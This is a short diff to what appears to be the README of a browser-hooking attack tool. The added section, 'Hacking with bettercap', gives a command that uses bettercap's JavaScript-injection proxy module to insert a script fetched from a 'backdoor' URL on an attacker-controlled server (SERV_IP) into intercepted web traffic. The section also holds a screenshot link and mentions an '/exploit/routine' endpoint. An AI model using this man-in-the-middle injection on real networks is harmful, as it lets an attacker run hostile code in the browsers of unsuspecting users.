@@ -14,6 +14,13 @@
     - os
     - request-ip
 
+##### Hacking with bettercap
+
+```
+--proxy-module injectjs --js-url "http://SERV_IP:3000/backdoor"
+```
+![bettercap with Neela](https://s32.postimg.org/duji0l405/Capture_d_e_cran_2016_07_07_a_16_25_50.png)
+
 ##### Make Routine & Hack !
 * /exploit/routine
 
